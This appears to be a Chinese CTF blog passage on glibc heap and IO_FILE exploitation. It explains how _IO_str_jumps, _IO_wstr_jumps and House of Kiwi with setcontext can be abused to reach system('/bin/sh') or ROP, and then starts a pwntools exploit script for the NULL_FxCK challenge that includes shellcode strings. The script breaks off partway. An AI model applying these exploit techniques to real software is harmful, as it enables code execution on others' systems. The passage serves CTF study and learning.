<h3 id="2-23版本"><a href="#2-23版本" class="headerlink" title="2.23版本"></a>2.23版本</h3><p>下面是<code>_IO_flush_all_lockp</code>函数的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;		<span class="comment">//覆盖为伪造的链表</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)		<span class="comment">//需要绕过这些检查</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)			<span class="comment">//fp指向伪造的vtable，触发虚函数</span></span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;		<span class="comment">//指向下一个对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意我们触发的条件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"> &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<h3 id="2-24版本之后"><a href="#2-24版本之后" class="headerlink" title="2.24版本之后"></a>2.24版本之后</h3><p><code>libc-2.24</code>加入了对<code>vtable</code>指针的检查，所有的<code>vtables</code>都被放进了<code>__libc_IO_vtables</code>段，使得它们在内存中连续，在任何跳转之前，<code>vtable</code>指针都会调用<code>IO_validate_vtable()</code>函数进行边缘检查，如果指针不在这个段，那么将会调用<code>IO_vtable_check()</code>函数进行进一步的检查。</p>
<h4 id="利用-IO-str-jumps"><a href="#利用-IO-str-jumps" class="headerlink" title="利用_IO_str_jumps"></a>利用_IO_str_jumps</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),		<span class="comment">// 利用_IO_str_finish</span></span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),		<span class="comment">// 利用_IO_str_overflow</span></span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>利用_IO_str_overflow</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))		<span class="comment">//检查</span></span><br><span class="line"> <span class="comment">// _IO_size_t的宏定义 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>	<span class="comment">//检查</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;		<span class="comment">// &quot;/bin/sh&quot;的地址</span></span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">          <span class="comment">// system(&quot;/bin/sh&quot;)</span></span><br><span class="line">	  new_buf</span><br><span class="line">	    = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造数据如下：</p>
<ul>
<li><p><code>fp-&gt;_flags = 0</code></p>
</li>
<li><p><code>fp-&gt;_IO_write_ptr = 0xffffffffffffffff</code></p>
</li>
<li><p><code>fp-&gt;_IO_write_base = 0</code></p>
</li>
<li><p><code>fp-&gt;_IO_buf_end = (str_bin_sh - 100) / 2</code> </p>
<p>注意：这里的<code>str_bin_sh</code>最好是偶数，避免除法向下取整，如果为奇数，可以选择加1。</p>
</li>
<li><p><code>fp-&gt;_IO_buf_base = 0</code></p>
</li>
<li><p><code>fp-&gt;mode = 0</code></p>
</li>
<li><p><code>fp + 0xe0 = system_addr</code></p>
</li>
</ul>
</li>
<li><p>利用_IO_str_finish</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))		<span class="comment">//检查</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);		<span class="comment">//system(&quot;/bin/sh&quot;)</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造数据如下：</p>
<ul>
<li><code>fp-&gt;mode = 0</code></li>
<li><code>fp-&gt;_IO_write_ptr = 0xffffffffffffffff</code></li>
<li><code>fp-&gt;_IO_write_base = 0</code></li>
<li><code>fp-&gt;_flag = 0</code></li>
<li><code>fp-&gt;_IO_buf_base = str_bin_sh</code></li>
<li><code>fp + 0xe0 = system_addr</code></li>
</ul>
</li>
</ol>
<h4 id="利用-IO-wstr-jumps"><a href="#利用-IO-wstr-jumps" class="headerlink" title="利用_IO_wstr_jumps"></a>利用_IO_wstr_jumps</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstr_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),		<span class="comment">//利用_IO_wstr_finish函数</span></span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),	<span class="comment">//利用_IO_wstr_overflow函数</span></span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Kiwi"><a href="#House-Of-Kiwi" class="headerlink" title="House_Of_Kiwi"></a>House_Of_Kiwi</h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>适用于当程序将各种hook函数禁用并且将exit函数更换为_exit函数，开启了sandbox只能orw的时候，通过<code>__malloc_assert</code>函数触发<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针，加上setcontext的技术可实现rop。当topchunk的大小不足以分配chunk的时候，会进入sysmalloc让我们有机会触发以下断言：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;	<span class="comment">// 将topchunk的prev_inuse改为0就可以触发断言进而触发__malloc_assert</span></span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);	<span class="comment">// 利用了stderr这个结构体，也恰好是_IO_list_all中存储的结构体</span></span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的触发链：<code>assert -&gt; __malloc_assert -&gt; fflush -&gt; __IO_file_sync</code></p>
<p><code>setcontext + 61</code>处的内容在2.29之后就由rdi转变为rdx控制，那如何控制setcontext中的rdx寄存器呢？2.32版本的setcontext如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;setcontext+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">91</span>&gt;:    mov    r15,QWORD PTR [rdx+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:    test   DWORD PTR fs:<span class="number">0x48</span>,<span class="number">0x2</span></span><br><span class="line">&lt;setcontext+<span class="number">107</span>&gt;:    je     <span class="number">0x7ffff7e31156</span> &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line">-&gt;</span><br><span class="line">&lt;setcontext+<span class="number">294</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">301</span>&gt;:    push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">302</span>&gt;:    mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">306</span>&gt;:    mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">310</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">317</span>&gt;:    mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">321</span>&gt;:    mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">325</span>&gt;:    mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">332</span>&gt;:    xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">334</span>&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>我们可以断在<code>call &lt;setcontext+61&gt;</code>的地方看看rdx到底是什么牛马，可以断在fflush函数中去查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">► 0x7ffff7e5bd53 &lt;fflush+131&gt;    call   qword ptr [rbp + 0x60]        &lt;setcontext+61&gt;</span><br><span class="line">       rdi: 0x7ffff7fc15e0 (_IO_2_1_stderr_) ◂— 0xfbad2887</span><br><span class="line">       rsi: 0x7fffffffba70 ◂— 0x616d203a6e69616d (&#x27;main: ma&#x27;)</span><br><span class="line">       rdx: 0x7ffff7fc18c0 (_IO_helper_jumps) ◂— 0x0</span><br><span class="line">       rcx: 0xc00</span><br><span class="line"></span><br><span class="line">  0x7ffff7e5bd56 &lt;fflush+134&gt;    xor    r8d, r8d</span><br><span class="line">  0x7ffff7e5bd59 &lt;fflush+137&gt;    test   eax, eax</span><br><span class="line">  0x7ffff7e5bd5b &lt;fflush+139&gt;    setne  r8b</span><br><span class="line">  0x7ffff7e5bd5f &lt;fflush+143&gt;    neg    r8d</span><br><span class="line">  0x7ffff7e5bd62 &lt;fflush+146&gt;    test   dword ptr [rbx], 0x8000</span><br><span class="line">  0x7ffff7e5bd68 &lt;fflush+152&gt;    jne    fflush+195                &lt;fflush+195&gt;</span><br><span class="line"></span><br><span class="line">  0x7ffff7e5bd6a &lt;fflush+154&gt;    mov    rdi, qword ptr [rbx + 0x88]</span><br><span class="line">  0x7ffff7e5bd71 &lt;fflush+161&gt;    mov    eax, dword ptr [rdi + 4]</span><br><span class="line">  0x7ffff7e5bd74 &lt;fflush+164&gt;    sub    eax, 1</span><br><span class="line">  0x7ffff7e5bd77 &lt;fflush+167&gt;    mov    dword ptr [rdi + 4], eax</span><br></pre></td></tr></table></figure>

<p>发现rdx的值就是<code>_IO_helper_jumps</code>指针，所以在<code>_IO_helper_jumps + 0xa0</code>和<code>_IO_helper_jumps + 0xa8</code>上写上我们rop链所在的地址和ret片段的地址就能实现rop。</p>
<h3 id="NULL-FxCK"><a href="#NULL-FxCK" class="headerlink" title="NULL_FxCK"></a>NULL_FxCK</h3><p>存在沙盒（orw）以及2.29版本之后的off-by-null漏洞，但是只能在edit的时候off-by-null一次，所以之后的数据构造都只能依赖于堆叠。由于2.29版本之后的off-by-null需要chunk的低位两个字节都为0x00，所以我们需要爆破，可以关闭地址随机化进行调试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space	# 关闭</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space	# 开启</span><br></pre></td></tr></table></figure>

<p>主要思路：</p>
<ul>
<li><p>利用off-by-null漏洞制造堆叠。</p>
<blockquote>
<p>参考我的另一篇文章：<a href="https://rmrfsad.github.io/2022/07/26/Pwn/off_by_null/">Off-By-Null总结 - Pursue</a></p>
</blockquote>
</li>
<li><p>利用largebin_attack劫持libc上存储的tcache_struct指针。</p>
</li>
<li><p>伪造tcache_struct，实现任意地址写任意数据。</p>
</li>
<li><p>house_of_kiwi，IO利用</p>
</li>
</ul>
<p>WP如下：</p>
<blockquote>
<p>可能和网上的答案不太一样，毕竟是自己独立构造的（真的很恶心🤢🤢🤢）</p>
</blockquote>
<p>注意：构造orw的时候<code>/flag</code>字符串不要放在开头，调试下来发现在open的时候会将orw的开头给覆盖成rdx的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-2.32.so&quot;</span>, <span class="string">b&quot;./main&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc-2.32.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(: Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;(: Content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># padding</span></span><br><span class="line">    add(<span class="number">0x2000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">    pad = <span class="number">0x1000</span> - <span class="number">0x2d0</span></span><br><span class="line">    add(pad, <span class="string">b&#x27;pursue&#x27;</span>)     <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># prepare</span></span><br><span class="line">    add(<span class="number">0x508</span>, <span class="string">b&#x27;prev&#x27;</span>)     <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x428</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;victim&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;chunk_a&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 